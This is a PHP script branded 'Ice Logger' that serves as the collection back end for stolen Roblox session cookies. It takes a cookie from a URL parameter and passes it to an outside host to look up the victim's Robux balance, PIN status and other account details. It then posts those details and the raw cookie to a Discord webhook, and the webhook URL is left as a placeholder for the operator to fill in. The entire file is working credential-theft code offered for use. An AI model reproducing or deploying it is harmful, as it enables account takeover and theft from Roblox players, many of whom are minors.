<?php

$wontent = htmlspecialchars($_GET['t']);

    //=======================================================================================================
// Create new webhook in your Discord channel settings and copy&paste URL
//=======================================================================================================

$webhookurl = "YourWebhook";

//=======================================================================================================
// Compose message. You can use Markdown
// Message Formatting -- https://discordapp.com/developers/docs/reference#message-formatting
//========================================================================================================

$timestamp = date("c", strtotime("now"));



if(strpos($wontent, "WARNING") !== false){

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://story-of-jesus.xyz/e.php?cookie=$wontent");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$profile = json_decode(curl_exec($ch), 1);
curl_close($ch);   


$json_data = json_encode([
    // Message
    "content" => "New Log",
    
    // Username
    "username" => "Ice Logger",
    "avatar_url" => "https://cdn.discordapp.com/avatars/891486210634154034/11d248defdd31e86a53acb2814a3a4b0.png?size=80",

    // Avatar URL.
    // Uncoment to replace image set in webhook
    //"avatar_url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=512",

    // Text-to-speech
    "tts" => false,

    // File upload
    // "file" => "",

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "New Log",

            // Embed Type
            "type" => "rich",

            // Embed Description

            // URL of title link
            "url" => "https://www.roblox.com/users/" . $profile["userid"] . "/profile",

            // Timestamp of embed must be formatted as ISO8601
            "timestamp" => $timestamp,

            // Embed left border color in HEX
            "color" => hexdec( "3366ff" ),

            // Footer
            "footer" => [
                "text" => "Bot by Ice Bear#8828",
                "icon_url" => ""
            ],

            // Image to send
            "image" => [
                "url" => "",
            ],
              "thumbnail" => [
            "url" => ""
            ],

            // Author
            "author" => [
                "name" => "Ice logger",
                "url" => "https://discord.gg/sUPRXSYMKg"
            ],

            // Additional Fields array
                        "fields" => [
                            [
                                "name" => "Username:",
                                "value" => $profile["username"],
                                "inline" => true
                            ],
                            [
                                "name" => "UserID:",
                                "value" => $profile["userid"],
                                "inline" => true
                            ],
							[
                                "name" => "Robux Balance:",
                                "value" => $profile["robux"],
                                "inline" => true
                            ],
							[
                                "name" => "Pending Robux:",
                                "value" => $profile["pendingrobux"],
                                "inline" => true
                            ],
                            [
                                "name" => "Rap:",
                                "value" => $profile["rap"],
                                "inline" => true
                            ],
							[
                                "name" => "Credit:",
                                "value" => $profile["credit"],
                                "inline" => true
                            ],
                            [
                                "name" => "Premium:",
                                "value" => $profile["premium"],
                                "inline" => true
                            ],
                            [
                                "name" => "Pin:",
                                "value" => $profile["pin"],
                                "inline" => true
                            ],
                            [
                                "name" => "Days Old:",
                                "value" =>  $profile["days-old"],
                                "inline" => true
                       	    ],
                            [
                                "name" => "Friends:",
                                "value" => $profile["friends"],
                                "inline" => true
                            ],
                            [
                                "name" => "Followers:",
                                "value" => $profile["followers"],
                                "inline" => true
                            ],
                            [
                                "name" => "Following:",
                                "value" => $profile["following"],
                                "inline" => true
                            ],
                            [
                                "name" => "Cookie:",
                                "value" => "```" . $wontent . "```",
                                "inline" => false
                            ]
                        ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


}


else {
$json_data = json_encode([
    // Message
    "content" => "New Log",
    
    // Username
    "username" => "Ice Logger",
    "avatar_url" => "https://cdn.discordapp.com/avatars/891486210634154034/11d248defdd31e86a53acb2814a3a4b0.png?size=80",

    // Avatar URL.
    // Uncoment to replace image set in webhook
    //"avatar_url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=512",

    // Text-to-speech
    "tts" => false,

    // File upload
    // "file" => "",

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "New Thing",

            // Embed Type
            "type" => "rich",

            // Embed Description
            "description" => "```" . $wontent . "```",

            // URL of title link
            "url" => "https://roblox.com/users/",

            // Timestamp of embed must be formatted as ISO8601
            "timestamp" => $timestamp,

            // Embed left border color in HEX
            "color" => hexdec( "3366ff" ),

            // Footer
            "footer" => [
                "text" => "Bot by Ice Bear#8828",
                "icon_url" => ""
            ],

            // Image to send
            "image" => [
                "url" => "",
            ],
              "thumbnail" => [
            "url" => ""
            ],

            // Author
            "author" => [
                "name" => "Ice logger",
                "url" => "https://discord.gg/sUPRXSYMKg"
            ],

            // Additional Fields array
            "fields" => [
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
}
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
curl_close( $ch );

?>
